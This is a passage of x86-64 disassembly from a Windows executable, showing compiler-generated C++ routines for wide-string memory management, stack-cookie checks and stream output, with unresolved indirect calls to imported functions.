   140002c72:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   140002c76:	45 33 c0             	xor    %r8d,%r8d
   140002c79:	33 d2                	xor    %edx,%edx
   140002c7b:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140002c80:	ff 15 82 23 00 00    	call   *0x2382(%rip)        # 0x140005008
   140002c86:	85 c0                	test   %eax,%eax
   140002c88:	0f 85 22 01 00 00    	jne    0x140002db0
   140002c8e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002c91:	48 8d 15 e8 28 00 00 	lea    0x28e8(%rip),%rdx        # 0x140005580
   140002c98:	0f 57 c9             	xorps  %xmm1,%xmm1
   140002c9b:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   140002ca0:	41 b8 c1 00 00 00    	mov    $0xc1,%r8d
   140002ca6:	0f 11 44 24 78       	movups %xmm0,0x78(%rsp)
   140002cab:	f3 0f 7f 4d 88       	movdqu %xmm1,-0x78(%rbp)
   140002cb0:	e8 db 07 00 00       	call   0x140003490
   140002cb5:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002cb8:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140002cbd:	0f 57 c9             	xorps  %xmm1,%xmm1
   140002cc0:	33 d2                	xor    %edx,%edx
   140002cc2:	41 b8 01 02 00 00    	mov    $0x201,%r8d
   140002cc8:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   140002ccd:	f3 0f 7f 4c 24 60    	movdqu %xmm1,0x60(%rsp)
   140002cd3:	e8 78 06 00 00       	call   0x140003350
   140002cd8:	48 83 7c 24 68 07    	cmpq   $0x7,0x68(%rsp)
   140002cde:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140002ce3:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002ce8:	c7 44 24 70 01 00 00 	movl   $0x1,0x70(%rsp)
   140002cef:	00 
   140002cf0:	48 0f 47 44 24 50    	cmova  0x50(%rsp),%rax
   140002cf6:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140002cfb:	0f b7 44 24 60       	movzwl 0x60(%rsp),%eax
   140002d00:	66 03 c0             	add    %ax,%ax
   140002d03:	66 44 89 74 24 40    	mov    %r14w,0x40(%rsp)
   140002d09:	66 89 44 24 42       	mov    %ax,0x42(%rsp)
   140002d0e:	ff 15 54 5a 00 00    	call   *0x5a54(%rip)        # 0x140008768
   140002d14:	48 8d 54 24 78       	lea    0x78(%rsp),%rdx
   140002d19:	48 8d 4d 98          	lea    -0x68(%rbp),%rcx
   140002d1d:	e8 ae e6 ff ff       	call   0x1400013d0
   140002d22:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140002d27:	48 8b d8             	mov    %rax,%rbx
   140002d2a:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140002d2e:	e8 0d 03 00 00       	call   0x140003040
   140002d33:	48 8b c8             	mov    %rax,%rcx
   140002d36:	48 8b d3             	mov    %rbx,%rdx
   140002d39:	e8 92 f9 ff ff       	call   0x1400026d0
   140002d3e:	48 8b 55 90          	mov    -0x70(%rbp),%rdx
   140002d42:	0f b6 d8             	movzbl %al,%ebx
   140002d45:	48 83 fa 07          	cmp    $0x7,%rdx
   140002d49:	76 3a                	jbe    0x140002d85
   140002d4b:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   140002d50:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140002d57:	00 
   140002d58:	48 8b c1             	mov    %rcx,%rax
   140002d5b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002d62:	72 1c                	jb     0x140002d80
   140002d64:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140002d68:	48 83 c2 27          	add    $0x27,%rdx
   140002d6c:	48 2b c1             	sub    %rcx,%rax
   140002d6f:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140002d73:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002d77:	76 07                	jbe    0x140002d80
   140002d79:	ff 15 91 24 00 00    	call   *0x2491(%rip)        # 0x140005210
   140002d7f:	cc                   	int3
   140002d80:	e8 b7 12 00 00       	call   0x14000403c
   140002d85:	84 db                	test   %bl,%bl
   140002d87:	74 27                	je     0x140002db0
   140002d89:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   140002d8e:	4c 8d 0d eb 29 00 00 	lea    0x29eb(%rip),%r9        # 0x140005780
   140002d95:	4c 8d 05 9c 2a 00 00 	lea    0x2a9c(%rip),%r8        # 0x140005838
   140002d9c:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140002da1:	48 8d 15 9c 2a 00 00 	lea    0x2a9c(%rip),%rdx        # 0x140005844
   140002da8:	33 c9                	xor    %ecx,%ecx
   140002daa:	ff 15 80 23 00 00    	call   *0x2380(%rip)        # 0x140005130
   140002db0:	33 c0                	xor    %eax,%eax
   140002db2:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   140002db6:	48 33 cc             	xor    %rsp,%rcx
   140002db9:	e8 e2 0f 00 00       	call   0x140003da0
   140002dbe:	4c 8d 9c 24 40 01 00 	lea    0x140(%rsp),%r11
   140002dc5:	00 
   140002dc6:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140002dca:	49 8b 73 18          	mov    0x18(%r11),%rsi
   140002dce:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   140002dd2:	4d 8b 73 28          	mov    0x28(%r11),%r14
   140002dd6:	49 8b e3             	mov    %r11,%rsp
   140002dd9:	5d                   	pop    %rbp
   140002dda:	c3                   	ret
   140002ddb:	cc                   	int3
   140002ddc:	cc                   	int3
   140002ddd:	cc                   	int3
   140002dde:	cc                   	int3
   140002ddf:	cc                   	int3
   140002de0:	40 53                	rex push %rbx
   140002de2:	48 83 ec 20          	sub    $0x20,%rsp
   140002de6:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   140002dea:	48 8b d9             	mov    %rcx,%rbx
   140002ded:	48 83 fa 07          	cmp    $0x7,%rdx
   140002df1:	76 31                	jbe    0x140002e24
   140002df3:	48 8b 09             	mov    (%rcx),%rcx
   140002df6:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140002dfd:	00 
   140002dfe:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002e05:	72 18                	jb     0x140002e1f
   140002e07:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   140002e0b:	48 83 c2 27          	add    $0x27,%rdx
   140002e0f:	49 2b c8             	sub    %r8,%rcx
   140002e12:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   140002e16:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002e1a:	77 1f                	ja     0x140002e3b
   140002e1c:	49 8b c8             	mov    %r8,%rcx
   140002e1f:	e8 18 12 00 00       	call   0x14000403c
   140002e24:	33 c0                	xor    %eax,%eax
   140002e26:	48 c7 43 18 07 00 00 	movq   $0x7,0x18(%rbx)
   140002e2d:	00 
   140002e2e:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140002e32:	66 89 03             	mov    %ax,(%rbx)
   140002e35:	48 83 c4 20          	add    $0x20,%rsp
   140002e39:	5b                   	pop    %rbx
   140002e3a:	c3                   	ret
   140002e3b:	ff 15 cf 23 00 00    	call   *0x23cf(%rip)        # 0x140005210
   140002e41:	cc                   	int3
   140002e42:	cc                   	int3
   140002e43:	cc                   	int3
   140002e44:	cc                   	int3
   140002e45:	cc                   	int3
   140002e46:	cc                   	int3
   140002e47:	cc                   	int3
   140002e48:	cc                   	int3
   140002e49:	cc                   	int3
   140002e4a:	cc                   	int3
   140002e4b:	cc                   	int3
   140002e4c:	cc                   	int3
   140002e4d:	cc                   	int3
   140002e4e:	cc                   	int3
   140002e4f:	cc                   	int3
   140002e50:	48 83 ec 28          	sub    $0x28,%rsp
   140002e54:	48 8d 0d f5 29 00 00 	lea    0x29f5(%rip),%rcx        # 0x140005850
   140002e5b:	ff 15 87 22 00 00    	call   *0x2287(%rip)        # 0x1400050e8
   140002e61:	cc                   	int3
   140002e62:	cc                   	int3
   140002e63:	cc                   	int3
   140002e64:	cc                   	int3
   140002e65:	cc                   	int3
   140002e66:	cc                   	int3
   140002e67:	cc                   	int3
   140002e68:	cc                   	int3
   140002e69:	cc                   	int3
   140002e6a:	cc                   	int3
   140002e6b:	cc                   	int3
   140002e6c:	cc                   	int3
   140002e6d:	cc                   	int3
   140002e6e:	cc                   	int3
   140002e6f:	cc                   	int3
   140002e70:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002e75:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140002e7a:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140002e7f:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140002e84:	57                   	push   %rdi
   140002e85:	41 56                	push   %r14
   140002e87:	41 57                	push   %r15
   140002e89:	48 83 ec 30          	sub    $0x30,%rsp
   140002e8d:	48 8b f1             	mov    %rcx,%rsi
   140002e90:	33 db                	xor    %ebx,%ebx
   140002e92:	89 5c 24 58          	mov    %ebx,0x58(%rsp)
   140002e96:	48 8b 01             	mov    (%rcx),%rax
   140002e99:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140002e9d:	48 8b 7c 0a 28       	mov    0x28(%rdx,%rcx,1),%rdi
   140002ea2:	48 83 ff 27          	cmp    $0x27,%rdi
   140002ea6:	7c 06                	jl     0x140002eae
   140002ea8:	48 83 c7 da          	add    $0xffffffffffffffda,%rdi
   140002eac:	eb 02                	jmp    0x140002eb0
   140002eae:	33 ff                	xor    %edi,%edi
   140002eb0:	4c 8b fe             	mov    %rsi,%r15
   140002eb3:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140002eb8:	48 8b 4c 0a 48       	mov    0x48(%rdx,%rcx,1),%rcx
   140002ebd:	48 85 c9             	test   %rcx,%rcx
   140002ec0:	74 07                	je     0x140002ec9
   140002ec2:	48 8b 01             	mov    (%rcx),%rax
   140002ec5:	ff 50 08             	call   *0x8(%rax)
   140002ec8:	90                   	nop
   140002ec9:	48 8b 06             	mov    (%rsi),%rax
   140002ecc:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002ed0:	48 03 ce             	add    %rsi,%rcx
   140002ed3:	ff 15 47 22 00 00    	call   *0x2247(%rip)        # 0x140005120
   140002ed9:	84 c0                	test   %al,%al
   140002edb:	74 30                	je     0x140002f0d
   140002edd:	48 8b 06             	mov    (%rsi),%rax
   140002ee0:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002ee4:	48 8b 4c 31 50       	mov    0x50(%rcx,%rsi,1),%rcx
   140002ee9:	48 85 c9             	test   %rcx,%rcx
   140002eec:	74 1d                	je     0x140002f0b
   140002eee:	48 3b ce             	cmp    %rsi,%rcx
   140002ef1:	74 18                	je     0x140002f0b
   140002ef3:	ff 15 07 22 00 00    	call   *0x2207(%rip)        # 0x140005100
   140002ef9:	48 8b 06             	mov    (%rsi),%rax
   140002efc:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002f00:	48 03 ce             	add    %rsi,%rcx
   140002f03:	ff 15 17 22 00 00    	call   *0x2217(%rip)        # 0x140005120
   140002f09:	eb 02                	jmp    0x140002f0d
   140002f0b:	b0 01                	mov    $0x1,%al
   140002f0d:	88 44 24 28          	mov    %al,0x28(%rsp)
   140002f11:	84 c0                	test   %al,%al
   140002f13:	75 0a                	jne    0x140002f1f
   140002f15:	bb 04 00 00 00       	mov    $0x4,%ebx
   140002f1a:	e9 c2 00 00 00       	jmp    0x140002fe1
   140002f1f:	48 8b 06             	mov    (%rsi),%rax
   140002f22:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002f26:	8b 44 31 18          	mov    0x18(%rcx,%rsi,1),%eax
   140002f2a:	25 c0 01 00 00       	and    $0x1c0,%eax
   140002f2f:	41 be ff ff 00 00    	mov    $0xffff,%r14d
   140002f35:	83 f8 40             	cmp    $0x40,%eax
   140002f38:	74 34                	je     0x140002f6e
   140002f3a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002f40:	48 85 ff             	test   %rdi,%rdi
   140002f43:	7e 29                	jle    0x140002f6e
   140002f45:	48 8b 06             	mov    (%rsi),%rax
   140002f48:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002f4c:	0f b7 54 31 58       	movzwl 0x58(%rcx,%rsi,1),%edx
   140002f51:	48 8b 4c 31 48       	mov    0x48(%rcx,%rsi,1),%rcx
   140002f56:	ff 15 bc 21 00 00    	call   *0x21bc(%rip)        # 0x140005118
   140002f5c:	66 44 3b f0          	cmp    %ax,%r14w
   140002f60:	75 07                	jne    0x140002f69
   140002f62:	bb 04 00 00 00       	mov    $0x4,%ebx
   140002f67:	eb 54                	jmp    0x140002fbd
   140002f69:	48 ff cf             	dec    %rdi
   140002f6c:	eb d2                	jmp    0x140002f40
   140002f6e:	48 8b 06             	mov    (%rsi),%rax
   140002f71:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002f75:	41 b8 26 00 00 00    	mov    $0x26,%r8d
   140002f7b:	48 8d 15 8e 24 00 00 	lea    0x248e(%rip),%rdx        # 0x140005410
   140002f82:	48 8b 4c 31 48       	mov    0x48(%rcx,%rsi,1),%rcx
   140002f87:	ff 15 7b 21 00 00    	call   *0x217b(%rip)        # 0x140005108
   140002f8d:	48 83 f8 26          	cmp    $0x26,%rax
   140002f91:	75 27                	jne    0x140002fba
   140002f93:	48 85 ff             	test   %rdi,%rdi
   140002f96:	7e 29                	jle    0x140002fc1
   140002f98:	48 8b 06             	mov    (%rsi),%rax
   140002f9b:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002f9f:	0f b7 54 31 58       	movzwl 0x58(%rcx,%rsi,1),%edx
   140002fa4:	48 8b 4c 31 48       	mov    0x48(%rcx,%rsi,1),%rcx
   140002fa9:	ff 15 69 21 00 00    	call   *0x2169(%rip)        # 0x140005118
   140002faf:	66 44 3b f0          	cmp    %ax,%r14w
   140002fb3:	74 05                	je     0x140002fba
   140002fb5:	48 ff cf             	dec    %rdi
   140002fb8:	eb d9                	jmp    0x140002f93
   140002fba:	83 cb 04             	or     $0x4,%ebx
   140002fbd:	89 5c 24 58          	mov    %ebx,0x58(%rsp)
   140002fc1:	48 8b 06             	mov    (%rsi),%rax
   140002fc4:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002fc8:	48 c7 44 31 28 00 00 	movq   $0x0,0x28(%rcx,%rsi,1)
   140002fcf:	00 00 
   140002fd1:	eb 0e                	jmp    0x140002fe1
   140002fd3:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140002fd8:	8b 5c 24 58          	mov    0x58(%rsp),%ebx
   140002fdc:	4c 8b 7c 24 20       	mov    0x20(%rsp),%r15
   140002fe1:	48 8b 06             	mov    (%rsi),%rax
   140002fe4:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002fe8:	48 03 ce             	add    %rsi,%rcx
   140002feb:	45 33 c0             	xor    %r8d,%r8d
   140002fee:	8b d3                	mov    %ebx,%edx
   140002ff0:	ff 15 1a 21 00 00    	call   *0x211a(%rip)        # 0x140005110
   140002ff6:	90                   	nop
   140002ff7:	ff 15 db 20 00 00    	call   *0x20db(%rip)        # 0x1400050d8
   140002ffd:	84 c0                	test   %al,%al
   140002fff:	75 0a                	jne    0x14000300b
   140003001:	49 8b cf             	mov    %r15,%rcx
   140003004:	ff 15 ee 20 00 00    	call   *0x20ee(%rip)        # 0x1400050f8
   14000300a:	90                   	nop
   14000300b:	49 8b 07             	mov    (%r15),%rax
   14000300e:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003012:	4a 8b 4c 39 48       	mov    0x48(%rcx,%r15,1),%rcx
   140003017:	48 85 c9             	test   %rcx,%rcx
   14000301a:	74 07                	je     0x140003023
   14000301c:	48 8b 01             	mov    (%rcx),%rax
   14000301f:	ff 50 10             	call   *0x10(%rax)
   140003022:	90                   	nop
   140003023:	48 8b c6             	mov    %rsi,%rax
   140003026:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   14000302b:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   140003030:	48 83 c4 30          	add    $0x30,%rsp
   140003034:	41 5f                	pop    %r15
   140003036:	41 5e                	pop    %r14
   140003038:	5f                   	pop    %rdi
   140003039:	c3                   	ret
   14000303a:	cc                   	int3
   14000303b:	cc                   	int3
   14000303c:	cc                   	int3
   14000303d:	cc                   	int3
   14000303e:	cc                   	int3
   14000303f:	cc                   	int3
   140003040:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140003045:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000304a:	57                   	push   %rdi
   14000304b:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   140003052:	48 8b 05 e7 4f 00 00 	mov    0x4fe7(%rip),%rax        # 0x140008040
   140003059:	48 33 c4             	xor    %rsp,%rax
   14000305c:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   140003061:	48 8b da             	mov    %rdx,%rbx
   140003064:	48 8b f9             	mov    %rcx,%rdi
   140003067:	48 89 4c 24 60       	mov    %rcx,0x60(%rsp)
   14000306c:	48 89 54 24 68       	mov    %rdx,0x68(%rsp)
   140003071:	33 f6                	xor    %esi,%esi
   140003073:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003076:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   14000307b:	0f 57 c9             	xorps  %xmm1,%xmm1
   14000307e:	f3 0f 7f 4c 24 40    	movdqu %xmm1,0x40(%rsp)
   140003084:	44 8d 46 32          	lea    0x32(%rsi),%r8d
   140003088:	48 8d 15 81 26 00 00 	lea    0x2681(%rip),%rdx        # 0x140005710
   14000308f:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003094:	e8 f7 03 00 00       	call   0x140003490
   140003099:	c7 44 24 50 01 00 00 	movl   $0x1,0x50(%rsp)
   1400030a0:	00 
   1400030a1:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   1400030a6:	48 83 7c 24 48 07    	cmpq   $0x7,0x48(%rsp)
   1400030ac:	48 0f 47 44 24 30    	cmova  0x30(%rsp),%rax
   1400030b2:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400030b7:	b8 62 00 00 00       	mov    $0x62,%eax
   1400030bc:	66 89 44 24 20       	mov    %ax,0x20(%rsp)
   1400030c1:	0f b7 44 24 40       	movzwl 0x40(%rsp),%eax
   1400030c6:	66 03 c0             	add    %ax,%ax
   1400030c9:	66 89 44 24 22       	mov    %ax,0x22(%rsp)
   1400030ce:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400030d3:	48 8b cb             	mov    %rbx,%rcx
   1400030d6:	e8 f5 ec ff ff       	call   0x140001dd0
   1400030db:	48 8b d0             	mov    %rax,%rdx
   1400030de:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400030e1:	0f 11 47 10          	movups %xmm0,0x10(%rdi)
   1400030e5:	48 89 77 20          	mov    %rsi,0x20(%rdi)
   1400030e9:	48 c7 47 28 07 00 00 	movq   $0x7,0x28(%rdi)
   1400030f0:	00 
   1400030f1:	66 89 77 10          	mov    %si,0x10(%rdi)
   1400030f5:	8b 40 30             	mov    0x30(%rax),%eax
   1400030f8:	89 47 30             	mov    %eax,0x30(%rdi)
   1400030fb:	44 0f b7 02          	movzwl (%rdx),%r8d
   1400030ff:	48 8b 52 08          	mov    0x8(%rdx),%rdx
   140003103:	48 8b cf             	mov    %rdi,%rcx
   140003106:	e8 e5 e1 ff ff       	call   0x1400012f0
   14000310b:	90                   	nop
   14000310c:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140003111:	48 83 fa 07          	cmp    $0x7,%rdx
   140003115:	76 3a                	jbe    0x140003151
   140003117:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   14000311e:	00 
   14000311f:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140003124:	48 8b c1             	mov    %rcx,%rax
   140003127:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000312e:	72 1c                	jb     0x14000314c
   140003130:	48 83 c2 27          	add    $0x27,%rdx
   140003134:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140003138:	48 2b c1             	sub    %rcx,%rax
   14000313b:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   14000313f:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003143:	76 07                	jbe    0x14000314c
   140003145:	ff 15 c5 20 00 00    	call   *0x20c5(%rip)        # 0x140005210
   14000314b:	cc                   	int3
   14000314c:	e8 eb 0e 00 00       	call   0x14000403c
   140003151:	66 0f 6f 05 37 27 00 	movdqa 0x2737(%rip),%xmm0        # 0x140005890
   140003158:	00 
   140003159:	f3 0f 7f 44 24 40    	movdqu %xmm0,0x40(%rsp)
   14000315f:	66 89 74 24 30       	mov    %si,0x30(%rsp)
   140003164:	48 8b 53 28          	mov    0x28(%rbx),%rdx
   140003168:	48 83 fa 07          	cmp    $0x7,%rdx
   14000316c:	76 32                	jbe    0x1400031a0
   14000316e:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140003175:	00 
   140003176:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   14000317a:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003181:	72 18                	jb     0x14000319b
   140003183:	48 83 c2 27          	add    $0x27,%rdx
   140003187:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   14000318b:	49 2b c8             	sub    %r8,%rcx
   14000318e:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   140003192:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003196:	77 3d                	ja     0x1400031d5
   140003198:	49 8b c8             	mov    %r8,%rcx
   14000319b:	e8 9c 0e 00 00       	call   0x14000403c
   1400031a0:	48 89 73 20          	mov    %rsi,0x20(%rbx)
   1400031a4:	48 c7 43 28 07 00 00 	movq   $0x7,0x28(%rbx)
   1400031ab:	00 
   1400031ac:	66 89 73 10          	mov    %si,0x10(%rbx)
   1400031b0:	48 8b c7             	mov    %rdi,%rax
   1400031b3:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   1400031b8:	48 33 cc             	xor    %rsp,%rcx
   1400031bb:	e8 e0 0b 00 00       	call   0x140003da0
   1400031c0:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
   1400031c7:	00 
   1400031c8:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   1400031cc:	49 8b 73 28          	mov    0x28(%r11),%rsi
   1400031d0:	49 8b e3             	mov    %r11,%rsp
   1400031d3:	5f                   	pop    %rdi
   1400031d4:	c3                   	ret
   1400031d5:	ff 15 35 20 00 00    	call   *0x2035(%rip)        # 0x140005210
   1400031db:	cc                   	int3
   1400031dc:	cc                   	int3
   1400031dd:	cc                   	int3
   1400031de:	cc                   	int3
   1400031df:	cc                   	int3
   1400031e0:	40 55                	rex push %rbp
   1400031e2:	56                   	push   %rsi
   1400031e3:	57                   	push   %rdi
   1400031e4:	48 83 ec 30          	sub    $0x30,%rsp
   1400031e8:	48 bf fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%rdi
   1400031ef:	ff ff 7f 
   1400031f2:	48 8b ea             	mov    %rdx,%rbp
   1400031f5:	48 8b f1             	mov    %rcx,%rsi
   1400031f8:	48 3b d7             	cmp    %rdi,%rdx
   1400031fb:	0f 87 39 01 00 00    	ja     0x14000333a
   140003201:	48 89 5c 24 60       	mov    %rbx,0x60(%rsp)
   140003206:	48 83 ca 07          	or     $0x7,%rdx
   14000320a:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   14000320f:	4c 8b 71 18          	mov    0x18(%rcx),%r14
   140003213:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140003218:	45 33 ff             	xor    %r15d,%r15d
   14000321b:	48 3b d7             	cmp    %rdi,%rdx
   14000321e:	76 10                	jbe    0x140003230
   140003220:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140003227:	ff ff 7f 
   14000322a:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   14000322e:	eb 52                	jmp    0x140003282
   140003230:	49 8b ce             	mov    %r14,%rcx
   140003233:	48 8b c7             	mov    %rdi,%rax
   140003236:	48 d1 e9             	shr    $1,%rcx
   140003239:	48 2b c1             	sub    %rcx,%rax
   14000323c:	4c 3b f0             	cmp    %rax,%r14
   14000323f:	76 10                	jbe    0x140003251
   140003241:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140003248:	ff ff 7f 
   14000324b:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   14000324f:	eb 31                	jmp    0x140003282
   140003251:	4a 8d 04 31          	lea    (%rcx,%r14,1),%rax
   140003255:	48 8b fa             	mov    %rdx,%rdi
   140003258:	48 3b d0             	cmp    %rax,%rdx
   14000325b:	48 0f 42 f8          	cmovb  %rax,%rdi
   14000325f:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140003266:	ff ff 7f 
   140003269:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
   14000326d:	48 3b c8             	cmp    %rax,%rcx
   140003270:	0f 87 ca 00 00 00    	ja     0x140003340
   140003276:	48 03 c9             	add    %rcx,%rcx
   140003279:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140003280:	72 2c                	jb     0x1400032ae
   140003282:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140003286:	48 3b c1             	cmp    %rcx,%rax
   140003289:	0f 86 b1 00 00 00    	jbe    0x140003340
   14000328f:	48 8b c8             	mov    %rax,%rcx
   140003292:	e8 29 0b 00 00       	call   0x140003dc0
   140003297:	48 85 c0             	test   %rax,%rax
   14000329a:	0f 84 93 00 00 00    	je     0x140003333
   1400032a0:	48 8d 58 27          	lea    0x27(%rax),%rbx
   1400032a4:	48 83 e3 e0          	and    $0xffffffffffffffe0,%rbx
   1400032a8:	48 89 43 f8          	mov    %rax,-0x8(%rbx)
   1400032ac:	eb 12                	jmp    0x1400032c0
   1400032ae:	48 85 c9             	test   %rcx,%rcx
   1400032b1:	74 0a                	je     0x1400032bd
   1400032b3:	e8 08 0b 00 00       	call   0x140003dc0
   1400032b8:	48 8b d8             	mov    %rax,%rbx
   1400032bb:	eb 03                	jmp    0x1400032c0
   1400032bd:	49 8b df             	mov    %r15,%rbx
   1400032c0:	48 89 6e 10          	mov    %rbp,0x10(%rsi)
   1400032c4:	48 89 7e 18          	mov    %rdi,0x18(%rsi)
   1400032c8:	48 85 ed             	test   %rbp,%rbp
   1400032cb:	74 0d                	je     0x1400032da
   1400032cd:	41 0f b7 c7          	movzwl %r15w,%eax
   1400032d1:	48 8b fb             	mov    %rbx,%rdi
   1400032d4:	48 8b cd             	mov    %rbp,%rcx
   1400032d7:	66 f3 ab             	rep stos %ax,(%rdi)
   1400032da:	66 44 89 3c 6b       	mov    %r15w,(%rbx,%rbp,2)
   1400032df:	49 83 fe 07          	cmp    $0x7,%r14
   1400032e3:	76 31                	jbe    0x140003316
   1400032e5:	48 8b 0e             	mov    (%rsi),%rcx
   1400032e8:	4a 8d 14 75 02 00 00 	lea    0x2(,%r14,2),%rdx
   1400032ef:	00 
   1400032f0:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400032f7:	72 18                	jb     0x140003311
   1400032f9:	48 8b 79 f8          	mov    -0x8(%rcx),%rdi
   1400032fd:	48 83 c2 27          	add    $0x27,%rdx
   140003301:	48 2b cf             	sub    %rdi,%rcx
   140003304:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   140003308:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000330c:	77 25                	ja     0x140003333
   14000330e:	48 8b cf             	mov    %rdi,%rcx
   140003311:	e8 26 0d 00 00       	call   0x14000403c
   140003316:	48 89 1e             	mov    %rbx,(%rsi)
   140003319:	48 8b c6             	mov    %rsi,%rax
   14000331c:	4c 8b 74 24 28       	mov    0x28(%rsp),%r14
   140003321:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140003326:	4c 8b 7c 24 20       	mov    0x20(%rsp),%r15
   14000332b:	48 83 c4 30          	add    $0x30,%rsp
   14000332f:	5f                   	pop    %rdi
   140003330:	5e                   	pop    %rsi
   140003331:	5d                   	pop    %rbp
   140003332:	c3                   	ret
   140003333:	ff 15 d7 1e 00 00    	call   *0x1ed7(%rip)        # 0x140005210
   140003339:	cc                   	int3
   14000333a:	e8 91 df ff ff       	call   0x1400012d0
   14000333f:	cc                   	int3
   140003340:	e8 eb de ff ff       	call   0x140001230
   140003345:	cc                   	int3
   140003346:	cc                   	int3
   140003347:	cc                   	int3
   140003348:	cc                   	int3
   140003349:	cc                   	int3
   14000334a:	cc                   	int3
   14000334b:	cc                   	int3
   14000334c:	cc                   	int3
   14000334d:	cc                   	int3
   14000334e:	cc                   	int3
   14000334f:	cc                   	int3
   140003350:	40 53                	rex push %rbx
   140003352:	56                   	push   %rsi
   140003353:	57                   	push   %rdi
   140003354:	41 57                	push   %r15
   140003356:	48 83 ec 28          	sub    $0x28,%rsp
   14000335a:	48 bf fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%rdi
   140003361:	ff ff 7f 
   140003364:	44 0f b7 fa          	movzwl %dx,%r15d
   140003368:	49 8b d8             	mov    %r8,%rbx
   14000336b:	48 8b f1             	mov    %rcx,%rsi
   14000336e:	4c 3b c7             	cmp    %rdi,%r8
   140003371:	0f 87 00 01 00 00    	ja     0x140003477
   140003377:	48 89 6c 24 58       	mov    %rbp,0x58(%rsp)
